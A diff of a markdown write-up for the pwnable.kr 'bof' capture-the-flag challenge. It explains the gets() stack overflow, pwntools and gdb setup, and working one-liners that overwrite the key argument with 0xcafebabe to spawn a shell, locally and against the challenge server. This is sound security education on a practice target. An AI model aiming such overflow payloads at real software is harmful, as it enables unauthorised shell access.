@@ -3,17 +3,53 @@
 A reference for the **bof** challenge on <https://pwnable.kr/play.php>. This is a
 classic stack buffer overflow where the goal is not to smash the return address,
 but to **overwrite a function argument** so a comparison passes and spawns a shell.
-I learned and practiced with this following wetw0rk's tutorial video (huge thanks to him!).
 
-https://www.youtube.com/watch?v=A-P2bhxzK1Y
+I learned and practiced with this following wetw0rk's tutorial video (huge thanks to him!):
+<https://www.youtube.com/watch?v=A-P2bhxzK1Y>
 
-Disclaimer: I am using Claude also to draft, but it's not slope I promise :) 
+Disclaimer: I used Claude to help draft this, but it's not slop I promise :)
+
+---
+
+## 0. Tools needed
+
+| Tool | What for | Install |
+|------|----------|---------|
+| **Kali Linux** | Default working environment (Ubuntu works too — but why tho) | — |
+| **gdb** | Dynamic analysis: break, step, inspect memory at runtime | `sudo apt install gdb` |
+| **pwntools** | Provides `cyclic` / `cyclic_find` (offset math) and `p32` (byte packing) | see below |
+
+### Installing pwntools (read this — there's a gotcha)
+
+```bash
+pipx install pwntools          # what I used
+# or
+pip install pwntools --break-system-packages   # Kali ships a managed Python; this flag avoids the nag
+```
+
+**Gotcha I hit:** after `pipx install`, the standalone `cyclic` command was "not found",
+and `python3 -c "from pwn import *"` couldn't import it either. That's because **pipx
+installs into its own isolated venv**, so your normal `python3` can't see the `pwn`
+module. Two fixes:
+
+- Expose the library to your system Python: `pipx inject pwntools pwntools`
+- Or just also do `pip install pwntools --break-system-packages`
+
+For a library you `import` in one-liners (rather than a CLI you run as a command),
+`pip install --break-system-packages` is the less fiddly choice. `pipx` is better for
+standalone command-line tools.
+
+> Note: `cyclic` isn't a separate install — it ships *inside* pwntools. We mostly use the
+> Python functions `cyclic()` and `cyclic_find()` rather than the standalone command, since
+> those work regardless of PATH issues.
+
+We use **plain gdb** for the whole debugging session — no plugin (pwndbg/GEF) required.
 
 ---
 
 ## 1. The vulnerability
 
-The challenge source is roughly:
+The challenge source C code is roughly:
 
 ```c
 void func(int key){
@@ -33,7 +69,7 @@ int main(int argc, char* argv[]){
 }
 ```
 
-Two facts make this exploitable:
+There are 2 facts here that make this exploitable:
 
 1. **`gets()` has no length limit.** It copies stdin into the 32-byte buffer until a
    newline, happily writing past the end of the buffer into whatever memory follows.
@@ -60,19 +96,7 @@ the buffer through saved EBP and the saved return address and lands on `key`.
 
 ---
 
-## 2. Prerequisites
-
-```bash
-pip install pwntools --break-system-packages   # Kali ships a managed Python; this avoids the nag
-# or: pipx install pwntools
-```
-
-We use plain `gdb` (no plugin required) plus pwntools from the command line for the
-cyclic pattern math.
-
----
-
-## 3. GDB session — finding where our input lands
+## 2. GDB session — finding where our input lands
 
 Launch GDB on the binary:
 
@@ -139,7 +163,7 @@ c
 ### Feed the cyclic pattern
 
 When prompted with `overflow me :`, paste a 200-byte cyclic (De Bruijn) pattern.
-Generate it locally first (see section 4) and paste it, or feed it from a file.
+Generate it locally first (see section 3) and paste it, or feed it from a file.
 
 A cyclic pattern is a string where every 4-byte chunk is unique, so wherever it lands
 we can identify the exact position from the 4 bytes we see.
@@ -163,7 +187,7 @@ Example output:
 
 ---
 
-## 4. Finding the offset locally (run this on your Kali)
+## 3. Finding the offset locally (run this on your Kali)
 
 The 4 bytes (`0x6161616e`) act as a unique coordinate into the pattern. The cyclic
 sequence is deterministic, so `cyclic_find` regenerates it and looks up the position —
@@ -192,7 +216,7 @@ would silently fail.
 
 ---
 
-## 5. Building the payload
+## 4. Building the payload
 
 ```bash
 python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt
@@ -230,7 +254,7 @@ Payload structure:
 
 ---
 
-## 6. Delivering it — and keeping the shell alive
+## 5. Delivering it — and keeping the shell alive
 
 `system("/bin/sh")` opens an **interactive** shell. If you just redirect the payload in,
 stdin hits end-of-file the instant the payload is consumed, so the shell opens and
@@ -270,7 +294,7 @@ p.interactive()
 
 ---
 
-## 7. Key takeaways
+## 6. Key takeaways
 
 - **The bug is intent vs. mechanism.** The programmer expected `gets()` to read a short
   line of text; the CPU just copies bytes until a newline. Feeding raw non-printable
@@ -293,21 +317,22 @@ p.interactive()
 ## Quick command reference
 
 ```bash
-# 1. install
+# 0. install (pick one)
+pipx install pwntools && pipx inject pwntools pwntools
 pip install pwntools --break-system-packages
 
-# 2. generate pattern, feed to program under gdb, read x/x $ebp+0x8
+# 1. generate pattern, feed to program under gdb, read x/x $ebp+0x8
 python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > pattern.txt
 
-# 3. find offset from the observed value
+# 2. find offset from the observed value
 python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"      # -> 52
 
-# 4. build payload (raw bytes)
+# 3. build payload (raw bytes)
 python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt
 
-# 5. fire locally, keeping the shell alive
+# 4. fire locally, keeping the shell alive
 (python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))"; cat) | ./bof
 
-# 5b. or fire at the real challenge
+# 4b. or fire at the real challenge
 python3 -c "from pwn import *; p=remote('pwnable.kr',9000); p.sendline(b'A'*52+p32(0xcafebabe)); p.interactive()"
 ```
